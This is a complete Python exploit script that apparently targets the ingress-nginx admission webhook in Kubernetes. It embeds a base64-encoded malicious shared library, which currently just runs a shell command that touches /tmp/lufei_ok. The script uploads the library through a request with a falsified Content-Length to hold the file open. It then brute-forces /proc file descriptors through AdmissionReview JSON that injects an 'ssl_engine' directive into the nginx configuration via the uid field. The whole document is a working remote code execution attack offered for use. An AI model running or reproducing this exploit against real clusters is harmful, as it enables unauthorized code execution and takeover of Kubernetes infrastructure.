import base64
import time

import requests
import sys
from urllib.parse import urlparse
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib3
import socket

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

pwn_base64 = "f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAAAAAAAAAAABAAAAAAAAAANAQAAAAAAAAAAAAAEAAOAAHAEAAEAAPAAEAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAMAAAAAAACgAwAAAAAAAAAQAAAAAAAAAQAAAAYAAACgDgAAAAAAAKAeAAAAAAAAoB4AAAAAAABwAQAAAAAAAHABAAAAAAAAABAAAAAAAAACAAAABgAAAKgOAAAAAAAAqB4AAAAAAACoHgAAAAAAAEABAAAAAAAAQAEAAAAAAAAIAAAAAAAAAAQAAAAEAAAAcAMAAAAAAABwAwAAAAAAAHADAAAAAAAAMAAAAAAAAAAwAAAAAAAAAAgAAAAAAAAAU+V0ZAQAAABwAwAAAAAAAHADAAAAAAAAcAMAAAAAAAAwAAAAAAAAADAAAAAAAAAACAAAAAAAAABR5XRkBgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAFLldGQEAAAAoA4AAAAAAACgHgAAAAAAAKAeAAAAAAAAYAEAAAAAAABgAQAAAAAAAAEAAAAAAAAAAQAAAAEAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAKAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAdW5zZXRlbnYAc3lzdGVtAAAAAAAAAACgHgAAAAAAAAgAAAAAAAAAwAIAAAAAAAAAIAAAAAAAAAcAAAABAAAAAAAAAAAAAAAIIAAAAAAAAAcAAAACAAAAAAAAAAAAAAD/NVodAAD/JVwdAAAPH0AA/yVaHQAAaAAAAADp4P////8lUh0AAGgBAAAA6dD///9VSInlSI0FGgAAAEiJx+jN////SI0FFgAAAEiJx+jO////kF3DTERfUFJFTE9BRABzaCAtYyAndG91Y2ggL3RtcC9sdWZlaV9va2snAAAAABQAAAAAAAAAAXpSAAF4EAEbDAcIkAEAABwAAAAcAAAAkP///yUAAAAAQQ4QhgJDDQZgDAcIAAAAIAAAADwAAABA////MAAAAAAOEEYOGEoPC3cIgAA/GjsqMyQiAAAAAAQAAAAgAAAABQAAAEdOVQABAAHABAAAAAEAAAAAAAAAAgABwAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAIAAAAAAAAZAAAAAAAAAKAeAAAAAAAAGwAAAAAAAAAIAAAAAAAAAPX+/28AAAAAyAEAAAAAAAAFAAAAAAAAADACAAAAAAAABgAAAAAAAADoAQAAAAAAAAoAAAAAAAAAEQAAAAAAAAALAAAAAAAAABgAAAAAAAAAAwAAAAAAAADoHwAAAAAAAAIAAAAAAAAAMAAAAAAAAAAUAAAAAAAAAAcAAAAAAAAAFwAAAAAAAABgAgAAAAAAAAcAAAAAAAAASAIAAAAAAAAIAAAAAAAAABgAAAAAAAAACQAAAAAAAAAYAAAAAAAAAPn//28AAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKgeAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKYCAAAAAAAAtgIAAAAAAABHQ0M6IChBbHBpbmUgMTMuMi4xX2dpdDIwMjQwMzA5KSAxMy4yLjEgMjAyNDAzMDkAAC5zaHN0cnRhYgAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3RyAC5yZWxhLmR5bgAucmVsYS5wbHQALnRleHQALnJvZGF0YQAuZWhfZnJhbWUALm5vdGUuZ251LnByb3BlcnR5AC5pbml0X2FycmF5AC5keW5hbWljAC5nb3QucGx0AC5jb21tZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAPb//28CAAAAAAAAAMgBAAAAAAAAyAEAAAAAAAAcAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAAAAAAAAAABUAAAALAAAAAgAAAAAAAADoAQAAAAAAAOgBAAAAAAAASAAAAAAAAAADAAAAAQAAAAgAAAAAAAAAGAAAAAAAAAAdAAAAAwAAAAIAAAAAAAAAMAIAAAAAAAAwAgAAAAAAABEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAJQAAAAQAAAACAAAAAAAAAEgCAAAAAAAASAIAAAAAAAAYAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAYAAAAAAAAAC8AAAAEAAAAQgAAAAAAAABgAgAAAAAAAGACAAAAAAAAMAAAAAAAAAACAAAADQAAAAgAAAAAAAAAGAAAAAAAAAA0AAAAAQAAAAYAAAAAAAAAkAIAAAAAAACQAgAAAAAAADAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAOQAAAAEAAAAGAAAAAAAAAMACAAAAAAAAwAIAAAAAAAAlAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAD8AAAABAAAAAgAAAAAAAADlAgAAAAAAAOUCAAAAAAAAKAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABHAAAAAQAAAAIAAAAAAAAAEAMAAAAAAAAQAwAAAAAAAFwAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAUQAAAAcAAAACAAAAAAAAAHADAAAAAAAAcAMAAAAAAAAwAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAGQAAAAOAAAAAwAAAAAAAACgHgAAAAAAAKAOAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAABwAAAABgAAAAMAAAAAAAAAqB4AAAAAAACoDgAAAAAAAEABAAAAAAAAAwAAAAAAAAAIAAAAAAAAABAAAAAAAAAAeQAAAAEAAAADAAAAAAAAAOgfAAAAAAAA6A8AAAAAAAAoAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAIIAAAABAAAAMAAAAAAAAAAAAAAAAAAAABAQAAAAAAAAMQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAwAAAAAAAAAAAAAAAAAAAAAAAABBEAAAAAAAAIsAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA"

admssion_json = """
{
   "kind": "AdmissionReview",
   "apiVersion": "admission.k8s.io/v1",
   "request": {
      "uid": "3babc164-2b11-4c9c-976a-52f477c63e35",
      "kind": {
         "group": "networking.k8s.io",
         "version": "v1",
         "kind": "Ingress"
      },
      "resource": {
         "group": "networking.k8s.io",
         "version": "v1",
         "resource": "ingresses"
      },
      "requestKind": {
         "group": "networking.k8s.io",
         "version": "v1",
         "kind": "Ingress"
      },
      "requestResource": {
         "group": "networking.k8s.io",
         "version": "v1",
         "resource": "ingresses"
      },
      "name": "minimal-ingress",
      "namespace": "default",
      "operation": "CREATE",
      "userInfo": {
         "uid": "1619bf32-d4cb-4a99-a4a4-d33b2efa3bc6"
      },
      "object": {
         "kind": "Ingress",
         "apiVersion": "networking.k8s.io/v1",
         "metadata": {
            "name": "minimal-ingress",
            "namespace": "default",
            "creationTimestamp": null,
            "uid": "test#;\\n\\n}\\n}\\n}\\nssl_engine ../../../../../../../REPLACE",
            "annotations": {
                "nginx.ingress.kubernetes.io/mirror-target": "xxxxxxxxxxx"
            }
         },
         "spec": {
            "ingressClassName": "nginx",
            "rules": [
               {
                  "host": "test.example.com",
                  "http": {
                     "paths": [
                        {
                           "path": "/",
                           "pathType": "Prefix",
                           "backend": {
                              "service": {
                                 "name": "kubernetes",
                                 "port": {
                                    "number": 443
                                 }
                              }
                           }
                        }
                     ]
                  }
               }
            ]
         },
         "status": {
            "loadBalancer": {}
         }
      },
      "oldObject": null,
      "dryRun": true,
      "options": {
         "kind": "CreateOptions",
         "apiVersion": "meta.k8s.io/v1"
      }
   }
}
"""


def send_request(admission_url, json_data, proc, fd):
    print(f"Trying Proc: {proc}, FD: {fd}")
    path = f"proc/{proc}/fd/{fd}"
    replaced_data = json_data.replace("REPLACE", path)

    headers = {
        "Content-Type": "application/json"
    }

    full_url = admission_url.rstrip("/") + "/admission"

    try:
        response = requests.post(full_url, data=replaced_data, headers=headers, verify=False, timeout=1)
        # print(response.text) - use this to debug (check response of admission webhook)
        print(f"Response for /proc/{proc}/fd/{fd}: {response.status_code}")
    except Exception as e:
        print(f"Error on /proc/{proc}/fd/{fd}: {e}")


def admission_brute(admission_url, max_workers=10):
    # proc = input("INPUT PROC:") - use this for manual testing
    # fd = input("INPUT FD:") - use this for manual testing
    # send_request(admission_url, json_data, proc, fd) - use this for manual testing

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        for proc in range(30, 50):  # can be increased to 100
            for fd in range(3, 30):  # can be increased to 100 (not recommended)
                executor.submit(send_request, admission_url, admssion_json, proc, fd)

        for proc in range(160, 180):  # can be increased to 100
            for fd in range(3, 30):  # can be increased to 100 (not recommended)
                executor.submit(send_request, admission_url, admssion_json, proc, fd)


def exploit(ingress_url):
    so = base64.b64decode(pwn_base64) + b"\00" * 8092

    real_length = len(so)
    fake_length = real_length + 10
    url = ingress_url

    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or 80
    path = parsed.path or "/"

    try:
        sock = socket.create_connection((host, port))
    except Exception as e:
        print(f"Error connecting to {host}:{port}: {e} - host is up?")
        sys.exit(0)
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: lufeisec\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Content-Length: {fake_length}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode("iso-8859-1")

    http_payload = headers + so
    sock.sendall(http_payload)

    response = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response += chunk

    print("[*] Resposta:")
    print(response.decode(errors="ignore"))

    sock.close()


if len(sys.argv) < 2:
    print("Usage: python3 exploit.py <ingress_url> <admission_webhook_url> ")
    sys.exit(0)
else:
    ingress_url = sys.argv[1]
    admission = sys.argv[2]

    # Send the library to the ingress pod and keep the connection open to keep the file open via the file descriptor (FD).
    x = threading.Thread(target=exploit, args=(ingress_url,))
    x.start()

    # time.sleep(9999 * 9999)
    # start the admission webhook brute force (/proc/{pid}/fd/{fd})
    admission_brute(admission)
